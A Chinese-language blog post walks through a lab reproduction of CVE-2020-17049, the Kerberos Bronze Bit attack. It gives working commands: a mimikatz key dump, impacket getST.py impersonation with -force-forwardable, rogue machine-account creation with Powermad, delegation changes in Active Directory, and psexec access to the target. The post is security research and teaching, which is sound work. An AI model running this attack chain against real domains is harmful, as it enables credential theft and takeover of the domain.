---
title: "Kerberos Bronze Bit Attack 绕过约束委派限制" # Title of the blog post.
date: 2020-12-22T10:51:18+08:00 # Date of post creation.
featured: false # Sets if post is a featured post, making appear on the home page side bar.
draft: false # Sets whether to render this page. Draft of true will not be rendered.
comment: true
tags:
- Kerberos
series:
- Windows协议
categories:
- 渗透测试
---


Kerberos Bronze Bit Attack又称Kerberos青铜比特攻击，由国外netspi安全研究员Jake Karnes发现的漏洞，并且申请了CVE-2020-17049编号。

<!--more-->

# 概述
该漏洞解决了两个问题

1. 禁止协议转换/协议过渡
2. 受保护的用户和敏感用户不能被委派

具体设置表现为DC上设置Service1计算机账户为“仅使用Kerberos”而非“使用任何身份验证协议”
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/881ce2ca-a6e9-3721-a663-51db3dc7113d.png)

spn服务账户sql设置为“敏感用户不能被委派”或者添加到“受保护的组”中（两者任选其一）
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/afde25f8-059a-3d1a-5a67-cd4444a3cf85.png)

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/a2755a89-6d5d-40fa-900a-8b2c1cd26e6a.png)

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/2e35318e-a14a-2178-743e-ce9a6559ff91.png)


利用场景：
1. 传统的约束委派
2. 基于资源的约束委派（滥用域账户的MachineAccountQuota属性）

下面进行复现

# 传统的约束委派绕过
模拟场景

1. 已经爆破了一个用户jack@test.local 密码为`test123!@#`
2. 拿到Service1的hash
3. Service1对Service2有信任的约束关系
4. 攻击者充当Service1向Service2申请票据从而ptt到Service2

首先尝试常规的约束委派利用（[参考我之前的文章](https://y4er.com/post/kerberos-constrained-delegation/)）

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/1582ae42-8b9b-e59f-99de-a7edcf315f8c.png)
报错，说明这是“敏感用户不能被委派”和“受保护的组”的原因。

然后尝试Kerberos Bronze Bit Attack

首先需要Service1的hash和aeskey（这里可以通过提权获取Service1的hash，我这里使用Service1的本地管理员账号抓取）

```
runas /user:Service1\administrator mimikatz
privilege::debug
sekurlsa::ekeys
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/5c06b5ee-596f-7fd7-2c98-edf332a400ad.png)

然后使用最新版的impacket请求票据

```
python3 getST.py -spn cifs/Service2.test.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:aa09cecb1728cd5cad6e779c7f370563 -aesKey 71f9caf9203575bbbe760e6a669d90cbe39be0b5a442496295e2f63990ee858f test.local/Service1 -force-forwardable
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/bf62dc9f-5e07-83a7-027e-e42db5c29c15.png)

这样绕过了“敏感用户不能被委派”和“受保护的组”利用约束委派拿下来了Service2。

# 基于资源的约束委派绕过
先配置环境，首先删除上一步service1的委派权限
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/fd401ea4-0a55-bcfa-2058-bdc98b688f3b.png)

用adsi编辑器赋予域用户jack对service2写入权限
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/4bf0c21f-aca5-5e09-ee95-b4314752bf18.png)

开始利用，首先需要通过powermad新加入一个计算机账户AttackerService，密码为AttackerServicePassword，用域账户jack登录service1

```
Import-Module .\Powermad\powermad.ps1
New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/d0b3dd3b-079d-1cd6-97a9-9aeba13464f5.png)

因为密码是我们自定义的，所以可以用mimikatz计算出hash

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/b8b19e1e-3234-f831-09f0-68a8e0676dc4.png)

然后使用PowerShell Active Directory模块添加基于资源的约束委派，即从AttackerService到Service2的传入信任关系。

`Microsoft.ActiveDirectory.Management.dll`在安装powershell模块Active Directory后生成，默认只在域控上有，可以从域控上导出。

```
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Get-ADComputer AttackerService #确认机器账户已经被添加
Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/a3535384-5d8f-7f3c-143b-c564a1f015e8.png)

设置好基于资源的约束委派之后就可以模拟用户申请票据了。

```
python3 getST.py -spn cifs/Service2.test.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardable
```
hashes和aesKey参数来自于添加的机器用户AttackerService，mimikatz可以计算。

```
export KRB5CCNAME=administrator.ccache
python3 psexec.py -no-pass -k Service2.test.local
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/cea4f8c9-4421-42a1-9ea9-e12dbe0277f5.png)

# 总结
Kerberos Bronze Bit Attack可以绕过“敏感用户不能被委派”和“受保护的组”进一步利用约束委派，扩大了Kerberos的攻击面。

# 参考
1. https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**
